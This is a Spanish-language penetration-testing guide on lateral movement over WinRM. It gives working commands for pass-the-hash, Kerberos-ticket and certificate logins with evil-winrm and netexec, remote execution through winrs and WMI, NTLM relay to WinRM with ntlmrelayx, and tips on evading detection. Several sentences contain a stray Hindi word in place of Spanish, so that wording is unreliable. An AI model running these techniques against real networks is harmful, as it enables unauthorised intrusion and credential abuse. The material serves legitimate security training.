# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM es uno de los transportes de **lateral movement** más convenientes en entornos Windows porque te da una shell remota sobre **WS-Man/HTTP(S)** sin necesidad de trucos de creación de servicios SMB. Si el objetivo expone **5985/5986** y tu principal tiene अनुमति para usar remoting, a menudo puedes pasar de "valid creds" a "interactive shell" muy rápido.

Para la **enumeración de protocolo/servicio**, listeners, habilitar WinRM, `Invoke-Command`, y uso genérico del cliente, revisa:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Usa **HTTP/HTTPS** en lugar de SMB/RPC, así que a menudo funciona donde la ejecución estilo PsExec está bloqueada.
- Con **Kerberos**, evita enviar credenciales reutilizables al objetivo.
- Funciona limpiamente desde tooling de **Windows**, **Linux**, y **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- La ruta interactiva de PowerShell remoting crea **`wsmprovhost.exe`** en el objetivo bajo el contexto del usuario autenticado, lo cual es operacionalmente diferente de la ejecución basada en servicios.

## Access model and prerequisites

En la práctica, un lateral movement exitoso por WinRM depende de **tres** cosas:

1. El objetivo tiene un **WinRM listener** (`5985`/`5986`) y reglas de firewall que permiten el acceso.
2. La cuenta puede **authenticate** al endpoint.
3. La cuenta tiene अनुमति para **open a remoting session**.

Formas comunes de obtener ese acceso:

- **Local Administrator** en el objetivo.
- Membresía en **Remote Management Users** en sistemas más nuevos o **WinRMRemoteWMIUsers__** en sistemas/componentes que aún respetan ese grupo.
- Derechos de remoting explícitos delegados mediante descriptores de seguridad locales / cambios en ACL de PowerShell remoting.

Si ya controlas una máquina con derechos de admin, recuerda que también puedes **delegate WinRM access without full admin group membership** usando las técnicas descritas aquí:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Si te conectas por IP, el cliente normalmente hace fallback a **NTLM/Negotiate**.
- En casos de **workgroup** o de trusts cruzados, NTLM normalmente requiere **HTTPS** o que el objetivo se añada a **TrustedHosts** en el cliente.
- Con **local accounts** sobre Negotiate en un workgroup, las restricciones remotas de UAC pueden impedir el acceso a menos que se use la cuenta Administrator integrada o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por defecto el SPN **`HTTP/<host>`**. En entornos donde **`HTTP/<host>`** ya está registrado a otra cuenta de servicio, WinRM Kerberos puede fallar con `0x80090322`; usa un SPN con puerto o cambia a **`WSMAN/<host>`** donde ese SPN exista.

Si obtienes credenciales válidas durante password spraying, validarlas por WinRM suele ser la forma más rápida de comprobar si se traducen en una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interactivos

`evil-winrm` sigue siendo la opción interactiva más conveniente desde Linux porque soporta **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferencia de archivos y carga en memoria de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso límite de Kerberos SPN: `HTTP` vs `WSMAN`

Cuando el SPN predeterminado **`HTTP/<host>`** causa fallos de Kerberos, prueba a solicitar/usar un ticket **`WSMAN/<host>`** en su lugar. Esto aparece en configuraciones empresariales endurecidas o inusuales donde **`HTTP/<host>`** ya está asignado a otra cuenta de servicio.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Esto también es útil después de abusar de **RBCD / S4U** cuando específicamente forjaste o solicitaste un ticket de servicio **WSMAN** en lugar de un ticket `HTTP` genérico.

### Autenticación basada en certificado

WinRM también admite **autenticación de certificado de cliente**, pero el certificado debe estar asignado en el objetivo a una **cuenta local**. Desde una perspectiva ofensiva, esto importa cuando:

- ya robaste/exportaste un certificado de cliente válido y una clave privada ya asignados para WinRM;
- abusaste de **AD CS / Pass-the-Certificate** para obtener un certificado para un principal y luego pivotar a otra ruta de autenticación;
- estás operando en entornos que evitan deliberadamente el remoting basado en contraseñas.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM es mucho menos común que la autenticación con password/hash/Kerberos, pero cuando existe puede proporcionar una vía de **lateral movement sin password** que sobrevive a la rotación de password.

### Python / automation with `pypsrp`

Si necesitas automatización en lugar de una shell de operador, `pypsrp` te da WinRM/PSRP desde Python con soporte para **NTLM**, **certificate auth**, **Kerberos** y **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Si necesitas un control más fino que el wrapper `Client` de alto nivel, las APIs de nivel inferior `WSMan` + `RunspacePool` son útiles para dos problemas comunes del operador:

- forzar **`WSMAN`** como el servicio/SPN de Kerberos en lugar de la expectativa predeterminada `HTTP` usada por muchos clientes de PowerShell;
- conectarse a un **endpoint PSRP no predeterminado** como una **JEA** / configuración de sesión personalizada en lugar de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Los endpoints PSRP personalizados y JEA importan durante el lateral movement

Una autenticación WinRM exitosa **no** siempre significa que aterrizas en el endpoint predeterminado sin restricciones `Microsoft.PowerShell`. Los entornos maduros pueden exponer **configuraciones de sesión personalizadas** o endpoints **JEA** con sus propias ACL y comportamiento run-as.

Si ya tienes ejecución de código en un host Windows y quieres entender qué superficies de remoting existen, enumera los endpoints registrados:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Cuando existe un endpoint útil, dirígelo explícitamente en lugar del shell por defecto:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicaciones ofensivas prácticas:

- Un endpoint **restringido** aún puede ser suficiente para lateral movement si expone solo los cmdlets/functions adecuados para control de servicios, acceso a archivos, creación de procesos o ejecución arbitraria de .NET / external command.
- Un rol de **JEA** mal configurado es especialmente valioso cuando expone comandos peligrosos como `Start-Process`, wildcards amplios, writable providers o custom proxy functions que te permiten escapar de las restricciones previstas.
- Los endpoints respaldados por **RunAs virtual accounts** o **gMSAs** cambian el security context efectivo de los comandos que ejecutas. En particular, un endpoint respaldado por gMSA puede proporcionar **network identity en el segundo hop** incluso cuando una sesión normal de WinRM se encontraría con el clásico problema de delegación.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` viene integrado y es útil cuando quieres **native WinRM command execution** sin abrir una sesión interactiva de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dos flags son fáciles de olvidar y son importantes en la práctica:

- `/noprofile` suele ser necesario cuando el principal remoto **no** es un administrador local.
- `/allowdelegate` permite que la shell remota use tus credenciales contra un **tercer host** (por ejemplo, cuando el comando necesita `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativamente, `winrs.exe` suele resultar en una cadena de procesos remota similar a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Vale la pena recordarlo porque difiere de exec basado en servicios y de las sesiones interactivas PSRP.

### `winrm.cmd` / WS-Man COM en lugar de PowerShell remoting

También puedes ejecutar a través de **WinRM transport** sin `Enter-PSSession` invocando clases WMI sobre WS-Man. Esto mantiene el transport como WinRM mientras que el primitivo de ejecución remota pasa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Ese enfoque es útil cuando:

- PowerShell logging está muy monitorizado.
- Quieres **WinRM transport** pero no un flujo de trabajo clásico de PS remoting.
- Estás creando o usando tooling personalizado alrededor del objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Cuando SMB relay está bloqueado por signing y LDAP relay está restringido, **WS-Man/WinRM** aún puede ser un objetivo de relay atractivo. `ntlmrelayx.py` moderno incluye **WinRM relay servers** y puede hacer relay a destinos **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dos notas prácticas:

- Relay es más útil cuando el objetivo acepta **NTLM** y al principal relayed se le अनुमति usar WinRM.
- El código reciente de Impacket maneja específicamente las solicitudes **`WSMANIDENTIFY: unauthenticated`** para que los probes estilo `Test-WSMan` no rompan el flujo de relay.

Para las restricciones multi-hop después de obtener una primera sesión de WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC y notas de detección

- **Interactive PowerShell remoting** normalmente crea **`wsmprovhost.exe`** en el objetivo.
- **`winrs.exe`** comúnmente crea **`winrshost.exe`** y luego el proceso hijo solicitado.
- Los endpoints personalizados de **JEA** pueden ejecutar acciones como cuentas virtuales **`WinRM_VA_*`** o como un **gMSA** configurado, lo que cambia tanto la telemetría como el comportamiento del second hop en comparación con un shell normal en contexto de usuario.
- Espera telemetría de **network logon**, eventos del servicio WinRM y logging operacional/script-block de PowerShell si usas PSRP en lugar de `cmd.exe` en bruto.
- Si solo necesitas un único comando, `winrs.exe` o una ejecución WinRM de una sola vez puede ser más silenciosa que una sesión interactiva de remoting de larga duración.
- Si Kerberos está disponible, prefiere **FQDN + Kerberos** sobre IP + NTLM para reducir tanto los problemas de confianza como los incómodos cambios del lado del cliente en `TrustedHosts`.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
